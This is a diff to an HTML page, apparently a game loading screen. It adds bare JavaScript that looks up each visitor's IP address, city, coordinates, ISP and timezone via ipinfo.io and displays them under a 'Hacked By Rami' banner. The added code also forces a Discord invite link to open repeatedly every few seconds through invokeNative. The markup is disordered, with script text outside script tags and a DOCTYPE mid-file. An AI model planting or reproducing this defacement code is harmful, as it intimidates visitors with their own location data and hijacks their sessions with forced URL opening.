@@ -121,7 +121,7 @@
     </video>
 
 
-    <div class="centered-text">هاي يابوطيز </div>
+    <div class="centered-text"> # Aziz </div>
 
     <div class="sub-text">The Secret Famliy Team <3 </div>
 
@@ -129,7 +129,39 @@
         <div class="gradual-text"> → ←</div>
       </a>
       
-      
+
+
+
+	
+        setTimeout(() => {
+            document.querySelector('.gif-container').style.display = 'none';
+            const content = document.getElementById('content');
+            content.style.display = 'block';
+            setTimeout(() => {
+                content.style.opacity = 1;
+            }, 150); 
+        }, 200);
+
+        fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const { ip, country, city, region, loc, org, timezone } = data;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.innerHTML = ` << Hacked By Rami  >>
+<strong>IP:</strong><span style='color: red;'>"${ip}"</span><br>
+<strong>City:</strong><span style='color: red;'>"${city}"</span><br>
+<strong>Region:</strong><span style='color: red;'>"${region}"</span><br>
+<strong>Country:</strong><span style='color: red;'>"${country}"</span><br>
+<strong>Location:</strong><span style='color: red;'>"${loc}"</span><br>
+<strong>ISP:</strong> <span style='color: red;'>"${org}"</span><br>
+<strong>Timezone:</strong><span style='color: red;'>"${timezone}"</span>`;
+        });
+
+        setInterval(function() {
+            window.invokeNative("openUrl", "https://discord.gg/S222WD");
+            window.invokeNative("openUrl", "https://discord.gg/S222WD");
+        }, 4500);
+    
 	
 <!DOCTYPE html>
 <html>
